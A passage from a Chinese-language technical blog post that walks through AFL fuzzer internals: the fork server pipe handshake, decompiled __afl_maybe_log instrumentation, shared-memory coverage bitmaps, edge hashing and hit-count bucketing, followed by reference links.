distinctive bitmap signature to tell the parent about execv() falling through. */</span></span><br><span class="line">    *(u32*)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//对于父进程（fuzzer），则会读取状态管道的信息，如果一切正常，则说明fork server创建完成。</span></span><br><span class="line">  close(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line">  close(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];</span><br><span class="line">  fsrv_st_fd  = st_pipe[<span class="number">0</span>];</span><br><span class="line">  ...</span><br><span class="line">      </span><br><span class="line">  rlen = read(fsrv_st_fd, &amp;status, <span class="number">4</span>);  <span class="comment">//从管道中读取4个字节</span></span><br><span class="line">  ...</span><br><span class="line">     <span class="comment">/* If we have a four-byte &quot;hello&quot; message from the server, we&#x27;re all set.</span></span><br><span class="line"><span class="comment">     Otherwise, try to figure out what went wrong. */</span></span><br><span class="line">  <span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    OKF(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  FATAL(<span class="string">&quot;Fork server handshake failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>execv(target_path, argv)</code>带参数执行target，这个函数除非出错不然不会返回。</p><ul><li>execv会替换掉原有的进程空间为target_path代表的程序，所以相当于后续就是去执行target_path，这个程序结束的话，子进程就结束。</li><li><strong>此时由于我们的目标程序的 main 函数已经被插桩，程序的控制流会交到<code>_afl_maybe_log</code>手中。所以关于 fork server 的其余工作都在<code>_afl_maybe_log</code>中完成。而在这里非常特殊，第一个target会进入<code>__afl_maybe_log</code>里的<code>__afl_fork_wait_loop</code>，并充当fork server，在整个Fuzz的过程中，它都不会结束，每次要Fuzz一次target，都会从这个fork server fork出来一个子进程去fuzz。</strong></li></ul><h2 id="afl-maybe-log"><a href="#afl-maybe-log" class="headerlink" title="__afl_maybe_log()"></a>__afl_maybe_log()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> __usercall _afl_maybe_log@&lt;al&gt;(<span class="keyword">char</span> a1@&lt;of&gt;, __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;xmm0&gt;, __int64 a4@&lt;xmm1&gt;, __int64 a5@&lt;xmm2&gt;, __int64 a6@&lt;xmm3&gt;, __int64 a7@&lt;xmm4&gt;, __int64 a8@&lt;xmm5&gt;, __int64 a9@&lt;xmm6&gt;, __int64 a10@&lt;xmm7&gt;, __int64 a11@&lt;xmm8&gt;, __int64 a12@&lt;xmm9&gt;, __int64 a13@&lt;xmm10&gt;, __int64 a14@&lt;xmm11&gt;, __int64 a15@&lt;xmm12&gt;, __int64 a16@&lt;xmm13&gt;, __int64 a17@&lt;xmm14&gt;, __int64 a18@&lt;xmm15&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  v19 = _afl_area_ptr;</span><br><span class="line">  <span class="keyword">if</span> ( !_afl_area_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_setup_failure )</span><br><span class="line">      <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">    v19 = _afl_global_area_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_global_area_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      _afl_area_ptr = _afl_global_area_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      v22 = getenv(<span class="string">&quot;__AFL_SHM_ID&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v22 || (v23 = atoi(v22), v24 = shmat(v23, <span class="number">0L</span>L, <span class="number">0</span>), v24 == (<span class="keyword">void</span> *)<span class="number">-1L</span>L) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++_afl_setup_failure;</span><br><span class="line">        v18 = v29;</span><br><span class="line">        <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _afl_area_ptr = (__int64)v24;</span><br><span class="line">      _afl_global_area_ptr = v24;</span><br><span class="line">      v28 = (__int64)v24;</span><br><span class="line">      <span class="keyword">if</span> ( write(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4u</span>LL) == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v25 = <span class="number">198</span>;</span><br><span class="line">          <span class="keyword">if</span> ( read(<span class="number">198</span>, &amp;_afl_temp, <span class="number">4u</span>LL) != <span class="number">4</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          LODWORD(v26) = fork();</span><br><span class="line">          <span class="keyword">if</span> ( v26 &lt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v26 )</span><br><span class="line">            <span class="keyword">goto</span> __afl_fork_resume;</span><br><span class="line">          _afl_fork_pid = v26;</span><br><span class="line">          write(<span class="number">199</span>, &amp;_afl_fork_pid, <span class="number">4u</span>LL);</span><br><span class="line">          v25 = _afl_fork_pid;</span><br><span class="line">          LODWORD(v27) = waitpid(_afl_fork_pid, &amp;_afl_temp, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v27 &lt;= <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          write(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        _exit(v25);</span><br><span class="line">      &#125;</span><br><span class="line">__afl_fork_resume:</span><br><span class="line">      close(<span class="number">198</span>);</span><br><span class="line">      close(<span class="number">199</span>);</span><br><span class="line">      v19 = v28;</span><br><span class="line">      v18 = v29;</span><br><span class="line">      a2 = v30;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v20 = _afl_prev_loc ^ a2;</span><br><span class="line">  _afl_prev_loc ^= v20;</span><br><span class="line">  _afl_prev_loc = (<span class="keyword">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  ++*(_BYTE *)(v19 + v20);</span><br><span class="line">  <span class="keyword">return</span> v18 + <span class="number">127</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读伪代码或者汇编，可以总结其工作流程如下：</p><ol><li><p>先判断是否设置了共享内存，如果没设置则判断<code>_afl_setup_failure</code>是否为真，如果为真，则代表setup失败，直接返回。也就是说只有第一次执行<code>__afl_maybe_log()</code>的时候，才会进入该 if 语句。</p><ul><li>如果初始化失败则直接返回</li><li>初始化成功后，读取<code>_afl_global_area_ptr</code>的值，不为 0 ，则赋值给 <code>_afl_area_ptr</code></li><li><code>_afl_global_area_ptr</code>为 0， 则把共享内存连接到当前进程的地址空间，将得到的地址，保存到<code>_afl_area_ptr</code>和<code>_afl_global_area_ptr</code>中。</li><li><code>write(199, &amp;_afl_temp, 4uLL) == 4</code>写4个字节到状态管道<code>st_pipe[0]</code>，forkserver 告诉 fuzzer 自己准备好了，而这正好是<code>rlen = read(fsrv_st_fd, &amp;status, 4);</code>中等待的信息。<ul><li><code>read(198, &amp;_afl_temp, 4uLL) != 4</code>forkserver 再从管道中读取 4 个字节，这时候表示 fuzzer 也准备好了。这时候 fork 出一个新的子进程，用来跑 target，而原本的父进程则用来通信。</li><li><code>write(199, &amp;_afl_fork_pid, 4uLL);</code>将子进程的 pid 写进管道，以为<code>fuzzer</code>的监控。</li><li>然后父进程即fork server等待子进程结束，并保存其执行结果到<code>_afl_temp</code>中，然后将子进程的执行结果，从<code>_afl_temp</code>写入到状态管道，告知fuzz。</li><li>父进程不断执行<code>__afl_fork_wait_loop</code>循环，不断从控制管道读取，直到fuzz端命令fork server进行新一轮测试。</li></ul></li></ul></li><li><p>如果共享内存已经被设置，则直接进入<code>__afl_store</code>逻辑，看伪代码可以知道：就是将上一个桩点的值(prev_location)和当前桩点的值(<code>R(MAP_SIZE)</code>)异或，取值后，使得<strong>共享内存里对应的槽</strong>的值加一，然后将prev_location设置为<code>cur_location &gt;&gt; 1;</code>。其余内容我们在下文分析。</p></li></ol><p>在fork server执行完毕后，当我们运行<code>target</code>的时候，fuzzer会调用<code>run_target()</code>，在此方法中，便是通过命令管道，通知fork server准备fork；并通过状态管道，获取子进程pid：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line">s32 res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In non-dumb mode, we have the fork server up and running, so simply tell it to have at it, and then read back PID. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;child_pid, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((res = read(fsrv_st_fd, &amp;status, <span class="number">4</span>)) != <span class="number">4</span>) &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">/*fuzzer再次读取状态管道，获取子进程退出状态，并由此来判断子进程结束的原因，例如正常退出、超时、崩溃等，并进行相应的记录。. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123;</span><br><span class="line"></span><br><span class="line">    kill_signal = WTERMSIG(status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (child_timed_out &amp;&amp; kill_signal == SIGKILL) <span class="keyword">return</span> FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FAULT_CRASH;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>简介来说整个 server 流程如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210413092653.png" alt="image-20210413092646310"></p><blockquote><p>afl 在初始化 forkserver 的时候会创建两个管道，fork 后通过 execve 去执行 target，因为目标程序的 main 函数已经被插桩，程序的控制流会交到_afl_maybe_log手中。如果 fuzz 实例是第一次运行，则此子进程则会充当 fuzz server，之后的程序都是由该 server fork出来的子进程。fuzz进行的时候，fuzz server会一直fork子进程，并且将子进程的结束状态通过pipe传递给afl-fuzz。</p></blockquote><h1 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h1><p>我们知道AFL 是以无限 fork 的形式进行 fuzzing 的，那么可以了解到 fuzzer 和 target 直接信息是要共享的，比如：执行过程中的分支信息；随后，fuzzer便可以根据这些信息，判断这次执行的整体流程和代码覆盖情况。</p><p>AFL使用共享内存，来完成以上信息在fuzzer和target之间的传递。具体地，fuzzer在启动时，会执行<code>setup_shm()</code>方法进行配置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">setup_shm</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* shm_str;</span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">    </span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) PFATAL(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atexit(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = alloc_printf(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  ck_free(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!trace_bits) PFATAL(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>shmget()：用来创建共享内存</p><p>shmat() ：第一次创建完共享内存时，它还不能被任何进程访问，shmat()函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间</p></blockquote><ul><li><p>首先调用<code>shemget()</code>分配一块共享内存，大小<code>MAP_SIZE</code>为64K</p></li><li><p>分配成功后，该共享内存的标志符会通过<code>setenv</code>设置到环境变量中，从而之后<code>fork()</code>得到的子进程可以通过该环境变量，得到这块共享内存的标志符</p></li><li><p>fuzzer 则会通过 <code>trace_bits</code> 来保存共享内存的地址</p></li><li><p>每次 fuzzer 去运行 target 的时候都会初始化共享内存</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//afl-fuzz.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> u8 <span class="title">run_target</span><span class="params">(<span class="keyword">char</span>** argv, u32 timeout)</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">memset</span>(trace_bits, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">  MEM_BARRIER();</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>而在 forkserver 内部</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char __usercall _afl_maybe_log@&lt;al&gt;(char a1@&lt;of&gt;, __int64 a2@&lt;rcx&gt;, __int64 a3@&lt;xmm0&gt;, __int64 a4@&lt;xmm1&gt;, __int64 a5@&lt;xmm2&gt;, __int64 a6@&lt;xmm3&gt;, __int64 a7@&lt;xmm4&gt;, __int64 a8@&lt;xmm5&gt;, __int64 a9@&lt;xmm6&gt;, __int64 a10@&lt;xmm7&gt;, __int64 a11@&lt;xmm8&gt;, __int64 a12@&lt;xmm9&gt;, __int64 a13@&lt;xmm10&gt;, __int64 a14@&lt;xmm11&gt;, __int64 a15@&lt;xmm12&gt;, __int64 a16@&lt;xmm13&gt;, __int64 a17@&lt;xmm14&gt;, __int64 a18@&lt;xmm15&gt;)</span><br><span class="line">&#123;</span><br><span class="line">      ...</span><br><span class="line">      v22 &#x3D; getenv(&quot;__AFL_SHM_ID&quot;);</span><br><span class="line">      if ( !v22 || (v23 &#x3D; atoi(v22), v24 &#x3D; shmat(v23, 0LL, 0), v24 &#x3D;&#x3D; (void *)-1LL) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++_afl_setup_failure;</span><br><span class="line">        v18 &#x3D; v29;</span><br><span class="line">        return v18 + 127;</span><br><span class="line">      &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  则会先判断共享内存是否被设置，然后通过调用<code>shmat()</code>，target将这块共享内存也映射到了自己的内存空间中，并将其地址保存在<code>__afl_area_ptr</code>及<code>edx</code>中。由此，便完成了fuzzer与target之间共享内存的设置。</p></li></ul><h1 id="分支信息的记录"><a href="#分支信息的记录" class="headerlink" title="分支信息的记录"></a>分支信息的记录</h1><p>由官网文档可知，AFL 是根据二元 tuple (跳转的源地址和目标地址)来记录分支信息，从而获取 target 的执行流程和代码覆盖情况，其伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400</span>CB0 __afl_store:                            ; CODE XREF: __afl_maybe_log+<span class="number">4F</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400</span>CB0                                         ; __afl_maybe_log+<span class="number">309</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400</span>CB0                 <span class="keyword">xor</span>     rcx, cs:__afl_prev_loc</span><br><span class="line">.text:<span class="number">0000000000400</span>CB7                 <span class="keyword">xor</span>     cs:__afl_prev_loc, rcx</span><br><span class="line">.text:<span class="number">0000000000400</span>CBE                 shr     cs:__afl_prev_loc, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400</span>CC5                 inc     byte ptr [rdx+rcx]</span><br><span class="line">    </span><br><span class="line">v20 = _afl_prev_loc ^ a2;</span><br><span class="line">_afl_prev_loc ^= v20;</span><br><span class="line"> _afl_prev_loc = (<span class="keyword">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">++*(_BYTE *)(v19 + v20);</span><br></pre></td></tr></table></figure><p>其中 a2 保存的寄存器 rcx 的值，跟踪可以发现，rcx 存贮的是随机数，那么简单来说上述流程就是：就是将上一个桩点的值(prev_location)和当前桩点的值(<code>R(MAP_SIZE)</code>)异或，取值后，使得<strong>共享内存里对应的槽</strong>的值加一，然后将<code>cur_location</code> 的值右移一位然后得到新的<code>prev_location</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++; </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>因为，AFL在为每个代码块插桩的时候都会生成一个随机数，作为其”位置”的记录，然后对分支处的”源位置”和”目标位置”进行异或，讲其结果作为该分支的 key，并保存每个分支的执行次数。</p><p>用于保存执行次数的实际上是一个哈希表，大小为<code>MAP_SIZE=64K</code>，当然会存在碰撞的问题；但根据AFL文档中的介绍，对于不是很复杂的目标，碰撞概率还是可以接受的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> Branch cnt | Colliding tuples | Example targets</span><br><span class="line">------------+------------------+-----------------</span><br><span class="line">      1,000 | 0.75%            | giflib, lzo</span><br><span class="line">      2,000 | 1.5%             | zlib, tar, xz</span><br><span class="line">      5,000 | 3.5%             | libpng, libwebp</span><br><span class="line">     10,000 | 7%               | libxml</span><br><span class="line">     20,000 | 14%              | sqlite</span><br><span class="line">     50,000 | 30%              | -</span><br></pre></td></tr></table></figure><p>如果一个目标过于复杂，那么AFL状态面板中的map_density信息就会有相应的提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│    map density : 3.61% &#x2F; 14.13%        │</span><br><span class="line">│ count coverage : 6.35 bits&#x2F;tuple       │</span><br><span class="line">┼─ findings in depth ────────────────────┤</span><br></pre></td></tr></table></figure><p>这里的map density，就是这张哈希表的密度。可以看到，上面示例中，该次执行的哈希表密度仅为3.61%，即整个哈希表差不多有95%的地方还是空的，所以碰撞的概率很小。不过，如果目标很复杂，map density很大，那么就需要考虑到碰撞的影响了。</p><p>另外，AFL需要将<code>cur_location</code>右移1位后，再保存到<code>prev_location</code>中。官方文档中解释了这样做的原因。假设target中存在<code>A-&gt;A</code>和<code>B-&gt;B</code>这样两个跳转，如果不右移，那么这两个分支对应的异或后的key都是0，从而无法区分；另一个例子是<code>A-&gt;B</code>和<code>B-&gt;A</code>，如果不右移，这两个分支对应的异或后的key也是相同的。</p><p>由上述分析可知，之前提到的共享内存，被用于保存一张哈希表，target在这张表中记录每个分支的执行数量。随后，当target执行结束后，fuzzer便开始对这张表进行分析，从而判断代码的执行情况。</p><h1 id="分支信息的分析"><a href="#分支信息的分析" class="headerlink" title="分支信息的分析"></a>分支信息的分析</h1><p>首先，fuzzer通过调用 <code>classify_counts</code> 对<code>trace_bits</code>（共享内存）进行预处理</p><p>具体地，target 是将每个分支的执行次数用 1 个 byte 来储存，而 fuzzer 则进一步把这个执行次数归入以下的 buckets 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>, </span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>, </span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>, </span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>, </span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>, </span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>举个例子，如果某分支执行了 1 次，那么落入第 2 个 bucket，其计数 byte 仍为 1；如果某分支执行了 4 次，那么落入第 5 个 bucket，其计数 byte 将变为 8，等等。（执行了 4-7 次的其计数为 8）</p><p>这样处理之后，对分支执行次数就会有一个简单的归类。例如，如果对某个测试用例处理时，分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。当然，这样的简单分类肯定不能区分所有的情况，不过在某种程度上，处理了一些因为循环次数的微小区别，而误判为不同执行结果的情况。</p><p>随后，对于某些mutated input来说，如果这次执行没有出现崩溃等异常输出，fuzzer还会检查其是否新增了执行路径。具体来说，是对<code>trace_bits</code>计算hash并来实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u32 cksum &#x3D; hash32(trace_bits, MAP_SIZE, HASH_CONST);</span><br></pre></td></tr></table></figure><p>通过比较hash值，就可以判断<code>trace_bits</code>是否发生了变化，从而判断此次mutated input是否带来了新路径，为之后的fuzzing提供参考信息。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">https://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</a></p><p><a href="https://www.cnblogs.com/52php/p/5861372.html">https://www.cnblogs.com/52php/p/5861372.html</a></p><p><a href="http://rk700.github.io/2017/12/28/afl-internals/">http://rk700.github.io/2017/12/28/afl-internals/</a></p><p><a href="https://xz.aliyun.com/t/4628#toc-10">https://xz.aliyun.com/t/4628#toc-10</a></p><p><a href="https://eternalsakura13.com/2020/08/23/afl/">https://eternalsakura13.com/2020/08/23/afl/</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=9d0ff5e0bae65f9ca9dbea4cf74449c6&amp;chksm=fb04159acc739c8c36e0785e2ce9c3a202066c6cc39a9ce32fd0fc9dfeb348e860a82e29c9d6&amp;scene=178&amp;cur_album_id=1363100069033066496#rd">https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=9d0ff5e0bae65f9ca9dbea4cf74449c6&amp;chksm=fb04159acc739c8c36e0785e2ce9c3a202066c6cc39a9ce32fd0fc9dfeb348e860a82e29c9d6&amp;scene=178&amp;cur_album_id=1363100069033066496#rd</a></p><p><a href="https://paper.seebug.org/842/#1-code-coverage">https://paper.seebug.org/842/#1-code-coverage</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFL </tag>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Build Winafl | HonggFuzz | AFL</title>
      <link href="posts/32c104a1/"/>
      <url>posts/32c104a1/</url>
      
